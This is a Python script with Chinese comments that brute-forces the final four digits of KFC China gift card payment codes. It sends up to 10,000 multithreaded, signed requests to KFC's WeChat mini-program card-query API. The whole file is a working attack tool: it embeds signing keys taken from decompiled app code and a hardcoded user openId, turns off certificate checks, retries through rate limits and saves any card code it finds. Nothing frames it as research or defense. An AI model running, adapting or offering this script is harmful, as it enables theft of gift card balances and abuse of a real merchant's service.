#!/usr/bin/env python3
"""KFC 礼品卡 paymentCode 多线程枚举"""
import hashlib
import json
import time
import urllib.request
import ssl
import threading
from queue import Queue

# ==================== 配置区 ====================

# --- 礼品卡信息 ---
CARD_SEQUENCE  = ""   # 卡号（cardSequence），例子：D0021IJD84HI3QE0000
PAYMENT_PREFIX = ""   # 密码前16位，后4位由脚本枚举，例子：210010224828252（填前16位即可）
TOKEN          = ""   # 登录凭证（从微信小程序抓包获取，有时效性）
OPEN_ID        = "omxHq0Jd7YT4IAQqpos_7StS_e4M"

# --- kbsv 签名参数（从反编译源码提取，一般不用改）---
CLIENT_KEY = "wxaupllQI8zMn8m8"
CLIENT_SEC = "6nVSIvoC16X1kaVl"
SIGN_PATH  = "/card/queryRealCardInfo"
FULL_URL   = "https://appcamp.kfc.com.cn/api/card/queryRealCardInfo"

# --- 运行参数 ---
THREADS    = 20    # 并发线程数
MAX_RETRY  = 5     # 单个卡密最大重试次数
RETRY_WAIT = 3     # 重试前等待秒数

# ==================== 以下为脚本逻辑，一般无需修改 ====================

BASE_HEADERS = {
    "Accept": "*/*",
    "Content-Type": "application/json",
    "X-Yumc-Route-Cell": "yumc4",
    "X-Yumc-Route-Channel": "weapp",
    "User-Agent": "Mozilla/5.0",
    "Referer": "https://servicewechat.com/wx08ee7f7d36a2eff8/455/page-frame.html",
    "Host": "appcamp.kfc.com.cn",
}

BASE_BODY = {
    "token": TOKEN,
    "cardSequence": CARD_SEQUENCE,
    "paymentCode": "",
    "openId": OPEN_ID,
    "encodeList": ["smsCode"],
    "isFromCustomerClient": True,
    "secretKey": "kfc",
}

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

found_event = threading.Event()
print_lock = threading.Lock()
count_lock = threading.Lock()
counter = {"done": 0}


def calc_kbsv(timestamp, body_json_str):
    """计算 kbsv 签名: MD5(key \t sec \t ts \t path \t\t body)"""
    raw = f"{CLIENT_KEY}\t{CLIENT_SEC}\t{timestamp}\t{SIGN_PATH}\t\t{body_json_str}"
    return hashlib.md5(raw.encode()).hexdigest()


def try_one(suffix):
    """尝试一个卡密后缀，返回响应文本"""
    payment_code = f"{PAYMENT_PREFIX}{suffix}"
    ts = str(int(time.time() * 1000))

    body = BASE_BODY.copy()
    body["paymentCode"] = payment_code
    body_json = json.dumps(body, separators=(',', ':'))

    kbsv = calc_kbsv(ts, body_json)

    headers = BASE_HEADERS.copy()
    headers.update({"kbck": CLIENT_KEY, "kbcts": ts, "kbsv": kbsv})

    req = urllib.request.Request(FULL_URL, data=body_json.encode(), headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, context=ssl_ctx, timeout=15) as r:
            return r.read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()
    except Exception as e:
        return json.dumps({"errCode": -1, "errMsg": f"异常:{e}"})


def worker(q):
    """工作线程：从队列取卡密后缀，发送请求，处理结果"""
    while not found_event.is_set():
        try:
            item = q.get_nowait()
        except:
            break

        # item: "0032" 或 ("0032", retry_count)
        if isinstance(item, tuple):
            sfx, retry = item
        else:
            sfx, retry = item, 0

        body = try_one(sfx)
        try:
            j = json.loads(body)
        except:
            j = {"errCode": -1, "errMsg": body[:100]}

        err_code = j.get("errCode")
        msg = j.get("errMsg", "")
        payment_code = f"{PAYMENT_PREFIX}{sfx}"
        tag = f"[重试{retry}次]" if retry > 0 else ""

        # === 兑换成功 ===
        if err_code == 0 or err_code == "0":
            found_event.set()
            with print_lock:
                print(f"\n{'='*60}")
                print(f">>> ✅ 兑换成功!")
                print(f">>> 卡号: {CARD_SEQUENCE}")
                print(f">>> 密码: {payment_code}")
                print(f">>> 响应: {body[:500]}")
                print(f"{'='*60}")
            with open("found_payment.txt", "w", encoding="utf-8") as f:
                f.write(f"卡号(cardSequence): {CARD_SEQUENCE}\n")
                f.write(f"密码(paymentCode):   {payment_code}\n")
                f.write(f"响应: {body}\n")
            return

        # === 541 = 卡号或密码错误，跳过 ===
        if "541" in str(err_code):
            with print_lock:
                print(f"[{payment_code}]{tag} {msg}", flush=True)
            with count_lock:
                counter["done"] += 1
            q.task_done()
            continue

        # === 其他错误（拥堵、超时等）→ 稍后重试 ===
        if retry < MAX_RETRY:
            with print_lock:
                print(f"[{payment_code}]{tag} {msg} -> 等待{RETRY_WAIT}s后重试", flush=True)
            time.sleep(RETRY_WAIT)
            q.put((sfx, retry + 1))
        else:
            with print_lock:
                print(f"[{payment_code}]{tag} {msg} -> 已达最大重试次数({MAX_RETRY})，跳过", flush=True)
            with count_lock:
                counter["done"] += 1
        q.task_done()


def main():
    q = Queue()
    for i in range(10000):
        q.put(f"{i:04d}")

    print(f"{'='*60}")
    print(f"KFC 礼品卡 paymentCode 多线程枚举")
    print(f"{'='*60}")
    print(f"卡号(cardSequence): {CARD_SEQUENCE}")
    print(f"密码前缀:           {PAYMENT_PREFIX}")
    print(f"枚举范围:           {PAYMENT_PREFIX}0000 ~ {PAYMENT_PREFIX}9999")
    print(f"线程数:             {THREADS}")
    print(f"最大重试:           {MAX_RETRY} 次")
    print(f"成功条件:           errCode = 0")
    print(f"{'='*60}\n")

    st = time.time()

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()
        threads.append(t)

    # 进度监控
    while not found_event.is_set() and any(t.is_alive() for t in threads):
        time.sleep(5)
        with count_lock:
            done = counter["done"]
        el = time.time() - st
        rate = done / el if el > 0 else 0
        with print_lock:
            print(f"\n--- 进度: {done}/10000 | {rate:.0f}req/s | 已用{el:.0f}s ---\n", flush=True)

    for t in threads:
        t.join(timeout=2)

    el = time.time() - st
    print(f"\n{'='*60}")
    if found_event.is_set():
        print(f"✅ 完成! 耗时 {el:.0f}s")
        print(f"结果已保存到 found_payment.txt")
    else:
        print(f"❌ 未找到(errCode=0)，耗时 {el:.0f}s")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
